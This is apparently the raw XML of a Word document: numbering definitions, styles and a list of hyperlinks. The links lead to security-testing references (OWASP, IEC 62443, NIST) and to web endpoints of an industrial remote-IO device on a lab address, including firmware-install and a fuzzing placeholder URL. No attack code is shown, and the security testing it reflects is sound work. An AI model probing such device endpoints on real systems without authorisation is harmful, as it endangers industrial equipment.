    <w:abstractNumId w:val="23"/>
  </w:num>
  <w:num w:numId="15" w16cid:durableId="532812063">
    <w:abstractNumId w:val="17"/>
  </w:num>
  <w:num w:numId="16" w16cid:durableId="1310286243">
    <w:abstractNumId w:val="50"/>
  </w:num>
  <w:num w:numId="17" w16cid:durableId="1907229569">
    <w:abstractNumId w:val="22"/>
  </w:num>
  <w:num w:numId="18" w16cid:durableId="1525361622">
    <w:abstractNumId w:val="0"/>
  </w:num>
  <w:num w:numId="19" w16cid:durableId="1666471468">
    <w:abstractNumId w:val="30"/>
  </w:num>
  <w:num w:numId="20" w16cid:durableId="2064939581">
    <w:abstractNumId w:val="13"/>
  </w:num>
  <w:num w:numId="21" w16cid:durableId="1620063526">
    <w:abstractNumId w:val="10"/>
  </w:num>
  <w:num w:numId="22" w16cid:durableId="1913077010">
    <w:abstractNumId w:val="49"/>
  </w:num>
  <w:num w:numId="23" w16cid:durableId="2081168027">
    <w:abstractNumId w:val="37"/>
  </w:num>
  <w:num w:numId="24" w16cid:durableId="1909073151">
    <w:abstractNumId w:val="38"/>
  </w:num>
  <w:num w:numId="25" w16cid:durableId="227304058">
    <w:abstractNumId w:val="36"/>
  </w:num>
  <w:num w:numId="26" w16cid:durableId="1088119887">
    <w:abstractNumId w:val="26"/>
  </w:num>
  <w:num w:numId="27" w16cid:durableId="1478917760">
    <w:abstractNumId w:val="34"/>
  </w:num>
  <w:num w:numId="28" w16cid:durableId="1895852289">
    <w:abstractNumId w:val="41"/>
  </w:num>
  <w:num w:numId="29" w16cid:durableId="1061827904">
    <w:abstractNumId w:val="14"/>
  </w:num>
  <w:num w:numId="30" w16cid:durableId="628824493">
    <w:abstractNumId w:val="32"/>
  </w:num>
  <w:num w:numId="31" w16cid:durableId="276328547">
    <w:abstractNumId w:val="42"/>
  </w:num>
  <w:num w:numId="32" w16cid:durableId="404573432">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="33" w16cid:durableId="301426545">
    <w:abstractNumId w:val="28"/>
  </w:num>
  <w:num w:numId="34" w16cid:durableId="1314025759">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="35" w16cid:durableId="59595500">
    <w:abstractNumId w:val="9"/>
  </w:num>
  <w:num w:numId="36" w16cid:durableId="1614748553">
    <w:abstractNumId w:val="24"/>
  </w:num>
  <w:num w:numId="37" w16cid:durableId="1687443471">
    <w:abstractNumId w:val="27"/>
  </w:num>
  <w:num w:numId="38" w16cid:durableId="592205756">
    <w:abstractNumId w:val="48"/>
  </w:num>
  <w:num w:numId="39" w16cid:durableId="669454524">
    <w:abstractNumId w:val="18"/>
  </w:num>
  <w:num w:numId="40" w16cid:durableId="981232184">
    <w:abstractNumId w:val="19"/>
  </w:num>
  <w:num w:numId="41" w16cid:durableId="407968460">
    <w:abstractNumId w:val="25"/>
  </w:num>
  <w:num w:numId="42" w16cid:durableId="62412731">
    <w:abstractNumId w:val="33"/>
  </w:num>
  <w:num w:numId="43" w16cid:durableId="1369574537">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="44" w16cid:durableId="1576278216">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="45" w16cid:durableId="221716380">
    <w:abstractNumId w:val="40"/>
  </w:num>
  <w:num w:numId="46" w16cid:durableId="1501970124">
    <w:abstractNumId w:val="16"/>
  </w:num>
  <w:num w:numId="47" w16cid:durableId="1739864227">
    <w:abstractNumId w:val="51"/>
  </w:num>
  <w:num w:numId="48" w16cid:durableId="1458572542">
    <w:abstractNumId w:val="45"/>
  </w:num>
  <w:num w:numId="49" w16cid:durableId="987395962">
    <w:abstractNumId w:val="20"/>
  </w:num>
  <w:num w:numId="50" w16cid:durableId="1912084782">
    <w:abstractNumId w:val="12"/>
  </w:num>
  <w:num w:numId="51" w16cid:durableId="1201043841">
    <w:abstractNumId w:val="31"/>
  </w:num>
  <w:num w:numId="52" w16cid:durableId="503589514">
    <w:abstractNumId w:val="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294"/>
    <w:rsid w:val="00015538"/>
    <w:rsid w:val="0002207B"/>
    <w:rsid w:val="0006297D"/>
    <w:rsid w:val="00106294"/>
    <w:rsid w:val="001320A9"/>
    <w:rsid w:val="00192C07"/>
    <w:rsid w:val="001A6916"/>
    <w:rsid w:val="001B231D"/>
    <w:rsid w:val="001D17A8"/>
    <w:rsid w:val="002046B2"/>
    <w:rsid w:val="00271C74"/>
    <w:rsid w:val="00297A8B"/>
    <w:rsid w:val="002D754B"/>
    <w:rsid w:val="002E6837"/>
    <w:rsid w:val="003165C7"/>
    <w:rsid w:val="00344B9C"/>
    <w:rsid w:val="003670E7"/>
    <w:rsid w:val="004117CC"/>
    <w:rsid w:val="0043237E"/>
    <w:rsid w:val="00444860"/>
    <w:rsid w:val="004602FD"/>
    <w:rsid w:val="0047270E"/>
    <w:rsid w:val="00483B71"/>
    <w:rsid w:val="004B46D1"/>
    <w:rsid w:val="004C5279"/>
    <w:rsid w:val="00576380"/>
    <w:rsid w:val="005B4077"/>
    <w:rsid w:val="00645886"/>
    <w:rsid w:val="00690A16"/>
    <w:rsid w:val="006E755F"/>
    <w:rsid w:val="006F109C"/>
    <w:rsid w:val="00716E6F"/>
    <w:rsid w:val="0077494B"/>
    <w:rsid w:val="007A60C3"/>
    <w:rsid w:val="007D03A4"/>
    <w:rsid w:val="007E038F"/>
    <w:rsid w:val="00812158"/>
    <w:rsid w:val="008B5690"/>
    <w:rsid w:val="008E6DD6"/>
    <w:rsid w:val="00960153"/>
    <w:rsid w:val="009745BD"/>
    <w:rsid w:val="00991EFB"/>
    <w:rsid w:val="009B0AAA"/>
    <w:rsid w:val="009D7F52"/>
    <w:rsid w:val="009E77F2"/>
    <w:rsid w:val="00A16302"/>
    <w:rsid w:val="00A366E1"/>
    <w:rsid w:val="00AC6357"/>
    <w:rsid w:val="00AD42B6"/>
    <w:rsid w:val="00B84B53"/>
    <w:rsid w:val="00B940EB"/>
    <w:rsid w:val="00BA4097"/>
    <w:rsid w:val="00C1714F"/>
    <w:rsid w:val="00CB35D8"/>
    <w:rsid w:val="00D04F61"/>
    <w:rsid w:val="00D73D4E"/>
    <w:rsid w:val="00DB074F"/>
    <w:rsid w:val="00DC3DB6"/>
    <w:rsid w:val="00E0208D"/>
    <w:rsid w:val="00E404B9"/>
    <w:rsid w:val="00E55DD7"/>
    <w:rsid w:val="00E57282"/>
    <w:rsid w:val="00EB0F23"/>
    <w:rsid w:val="00ED45D6"/>
    <w:rsid w:val="00EE02F6"/>
    <w:rsid w:val="00F84A6B"/>
    <w:rsid w:val="00F9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0994B8"/>
  <w15:chartTrackingRefBased/>
  <w15:docId w15:val="{0666C3F8-2039-4E82-9583-A25DB9EF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TW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6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6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6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6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6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6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6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6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6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6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6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62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62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62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62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62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62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6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62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62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62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6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62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629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062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06294"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Fuzeile">
    <w:name w:val="footer"/>
    <w:basedOn w:val="Standard"/>
    <w:link w:val="FuzeileZchn"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="001062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06294"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="KeinLeerraum">
    <w:name w:val="No Spacing"/>
    <w:link w:val="KeinLeerraumZchn"/>
    <w:uiPriority w:val="1"/>
    <w:qFormat/>
    <w:rsid w:val="00106294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DB074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B074F"/>
    <w:rPr>
      <w:color w:val="605E5C"/>
      <w:shd w:val="clear" w:color="auto" w:fill="E1DFDD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C17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fmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/218_SRIO_Manual%20_%2020_System%20_%20Documents%20%26%20Pages%20_%20Safe_RemoteIO.pdf" TargetMode="External"/><Relationship Id="rId299" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/IEC62443_4_2_source.txt" TargetMode="External"/><Relationship Id="rId21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63" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/deviceinfo/" TargetMode="External"/><Relationship Id="rId15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24" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/218_SRIO_Manual%20_%2020_System%20_%20Documents%20%26%20Pages%20_%20Safe_RemoteIO.pdf" TargetMode="External"/><Relationship Id="rId170" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/Testumgebung%20Security.md" TargetMode="External"/><Relationship Id="rId226" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/Testumgebung%20Security.md" TargetMode="External"/><Relationship Id="rId26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2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/218_SRIO_Manual%20_%2020_System%20_%20Documents%20%26%20Pages%20_%20Safe_RemoteIO.pdf" TargetMode="External"/><Relationship Id="rId74" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/systemtime/systick" TargetMode="External"/><Relationship Id="rId12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35" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/deviceinfo/swrevision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23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7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43" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/safecom/f_address" TargetMode="External"/><Relationship Id="rId13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9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0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46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8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5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9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06" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/devicestatus/errorlog/loglist" TargetMode="External"/><Relationship Id="rId24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0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15" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/devicestatus/errorlog/loglist" TargetMode="External"/><Relationship Id="rId357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5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9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6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1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59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23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1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7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2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65" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/devicestatus/errorlog/loglist" TargetMode="External"/><Relationship Id="rId130" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/OWASP%20Firmware%20Security%20Testing.md" TargetMode="External"/><Relationship Id="rId172" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/$ep" TargetMode="External"/><Relationship Id="rId228" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/devicestatus/errorlog/loglist" TargetMode="External"/><Relationship Id="rId281" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/IEC62443_4_2_source.txt" TargetMode="External"/><Relationship Id="rId33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4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76" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/systemtime/systick" TargetMode="External"/><Relationship Id="rId14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7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/endnotes" Target="endnotes.xml"/><Relationship Id="rId183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3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50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29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0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45" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/IEC62443_4_2_source.txt" TargetMode="External"/><Relationship Id="rId8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10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/IEC62443_4_2_source.txt" TargetMode="External"/><Relationship Id="rId34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52" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/ICS-Security_kompendium_pdf.pdf" TargetMode="External"/><Relationship Id="rId194" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/Testumgebung%20Security.md" TargetMode="External"/><Relationship Id="rId20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61" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/FUZZ" TargetMode="External"/><Relationship Id="rId1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5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17" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/systemtime/systick" TargetMode="External"/><Relationship Id="rId35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98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121" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/OWASP%20IoT%20Security%20Testing%20Guide.pdf" TargetMode="External"/><Relationship Id="rId163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1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30" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/systemtime/systick" TargetMode="External"/><Relationship Id="rId25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67" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/devicestatus/errorlog/loglist" TargetMode="External"/><Relationship Id="rId27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2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8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1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3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53" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/Testumgebung%20Security.md" TargetMode="External"/><Relationship Id="rId174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195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209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360" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/footer" Target="footer1.xml"/><Relationship Id="rId22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41" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/IEC62443_4_2_source.txt" TargetMode="External"/><Relationship Id="rId15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3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57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26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83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31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3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7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99" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/$ep" TargetMode="External"/><Relationship Id="rId101" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/fieldbussetup/fieldbusfirmware" TargetMode="External"/><Relationship Id="rId122" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/OWASP%20Firmware%20Security%20Testing.md" TargetMode="External"/><Relationship Id="rId143" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/ICS-Security_kompendium_pdf.pdf" TargetMode="External"/><Relationship Id="rId164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185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350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1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6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/IEC62443_4_2_source.txt" TargetMode="External"/><Relationship Id="rId231" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/devicestatus/errorlog/loglist" TargetMode="External"/><Relationship Id="rId25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73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9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08" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/Testumgebung%20Security.md" TargetMode="External"/><Relationship Id="rId32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47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68" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/safecom/f_address" TargetMode="External"/><Relationship Id="rId8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1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33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15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7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40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361" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/fontTable" Target="fontTable.xml"/><Relationship Id="rId196" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/devicestatus/errorlog/loglist" TargetMode="External"/><Relationship Id="rId200" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/systemtime/systick" TargetMode="External"/><Relationship Id="rId16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22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4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63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28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1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7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5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7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0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23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14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30" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/218_SRIO_Manual%20_%2020_System%20_%20Documents%20%26%20Pages%20_%20Safe_RemoteIO.pdf" TargetMode="External"/><Relationship Id="rId9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6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8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51" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/devicestatus/errorlog/loglist" TargetMode="External"/><Relationship Id="rId211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32" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/devicestatus/errorlog/loglist" TargetMode="External"/><Relationship Id="rId253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27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9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09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27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48" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/IEC62443_4_2_source.txt" TargetMode="External"/><Relationship Id="rId69" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/devicestatus/operatingstate" TargetMode="External"/><Relationship Id="rId113" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/218_SRIO_Manual%20_%2020_System%20_%20Documents%20%26%20Pages%20_%20Safe_RemoteIO.pdf" TargetMode="External"/><Relationship Id="rId134" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/IEC62443_4_2_source.txt" TargetMode="External"/><Relationship Id="rId32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80" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/IEC62443_4_2_source.txt" TargetMode="External"/><Relationship Id="rId15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76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197" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/firmware/version" TargetMode="External"/><Relationship Id="rId34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62" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme1.xml"/><Relationship Id="rId201" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/firmware/install" TargetMode="External"/><Relationship Id="rId222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43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6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85" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/Testumgebung%20Security.md" TargetMode="External"/><Relationship Id="rId1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8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/Testumgebung%20Security.md" TargetMode="External"/><Relationship Id="rId5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03" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/OWASP%20Firmware%20Security%20Testing.md" TargetMode="External"/><Relationship Id="rId124" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/Testumgebung%20Security.md" TargetMode="External"/><Relationship Id="rId310" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/devicestatus/errorlog/loglist" TargetMode="External"/><Relationship Id="rId70" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/devicestatus/errorlog/loglist" TargetMode="External"/><Relationship Id="rId9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45" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/Testumgebung%20Security.md" TargetMode="External"/><Relationship Id="rId166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187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331" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/IEC62443_4_2_source.txt" TargetMode="External"/><Relationship Id="rId35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33" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/systemtime/systick" TargetMode="External"/><Relationship Id="rId25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8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4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14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75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96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30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60" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/Testumgebung%20Security.md" TargetMode="External"/><Relationship Id="rId8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3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56" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/OWASP%20Firmware%20Security%20Testing.md" TargetMode="External"/><Relationship Id="rId17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98" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/devicestatus/errorlog/loglist" TargetMode="External"/><Relationship Id="rId321" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/IEC62443_4_2_source.txt" TargetMode="External"/><Relationship Id="rId342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02" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/devicestatus/errorlog/loglist" TargetMode="External"/><Relationship Id="rId223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44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1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9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265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86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50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104" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/ICS-Security_kompendium_pdf.pdf" TargetMode="External"/><Relationship Id="rId125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146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16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88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311" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/devicestatus/errorlog/loglist" TargetMode="External"/><Relationship Id="rId332" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/Testumgebung%20Security.md" TargetMode="External"/><Relationship Id="rId353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71" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/safecom/f_address" TargetMode="External"/><Relationship Id="rId9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13" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/IEC62443_4_2_source.txt" TargetMode="External"/><Relationship Id="rId23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55" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/Testumgebung%20Security.md" TargetMode="External"/><Relationship Id="rId276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29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40" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/NIST%20Technical%20Guide%20to%20Information%20Security%20Testing%20and%20Assessment.pdf" TargetMode="External"/><Relationship Id="rId11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3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57" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/IEC62443_4_2_source.txt" TargetMode="External"/><Relationship Id="rId178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30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2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43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61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8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99" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/devicestatus/errorlog/loglist" TargetMode="External"/><Relationship Id="rId203" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/systemtime/systick" TargetMode="External"/><Relationship Id="rId19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22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4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66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287" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/safecom/f_address" TargetMode="External"/><Relationship Id="rId3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0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26" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/firmware/container/start_stream_set" TargetMode="External"/><Relationship Id="rId147" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/$ep" TargetMode="External"/><Relationship Id="rId16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1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33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354" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/devicestatus/errorlog/loglist" TargetMode="External"/><Relationship Id="rId5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7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93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8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" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/><Relationship Id="rId214" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/IEC62443_4_2_source.txt" TargetMode="External"/><Relationship Id="rId235" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/devicestatus/errorlog/loglist" TargetMode="External"/><Relationship Id="rId256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277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98" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/IEC62443_4_2_source.txt" TargetMode="External"/><Relationship Id="rId116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13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5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0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23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4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0" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/Testumgebung%20Security.md" TargetMode="External"/><Relationship Id="rId41" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/safecom/f_address" TargetMode="External"/><Relationship Id="rId62" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/devicestatus/errorlog/loglist" TargetMode="External"/><Relationship Id="rId83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179" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/IEC62443_4_2_source.txt" TargetMode="External"/><Relationship Id="rId19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0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2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46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67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88" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/deviceinfo/swrevision" TargetMode="External"/><Relationship Id="rId10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27" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/firmware/install" TargetMode="External"/><Relationship Id="rId313" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/devicestatus/errorlog/loglist" TargetMode="External"/><Relationship Id="rId10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31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52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73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94" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/OWASP%20Firmware%20Security%20Testing.md" TargetMode="External"/><Relationship Id="rId14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69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34" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/firmware/version" TargetMode="External"/><Relationship Id="rId35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1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36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57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278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303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42" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/safecom/f_address" TargetMode="External"/><Relationship Id="rId84" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/IEC62443_4_2_source.txt" TargetMode="External"/><Relationship Id="rId13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4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9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05" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/devicestatus/errorlog/loglist" TargetMode="External"/><Relationship Id="rId247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10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89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11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53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149" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/fieldbussetup/fieldbusfirmware" TargetMode="External"/><Relationship Id="rId314" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.0.2/systemtime/systick" TargetMode="External"/><Relationship Id="rId35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95" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/ICS-Security_kompendium_pdf.pdf" TargetMode="External"/><Relationship 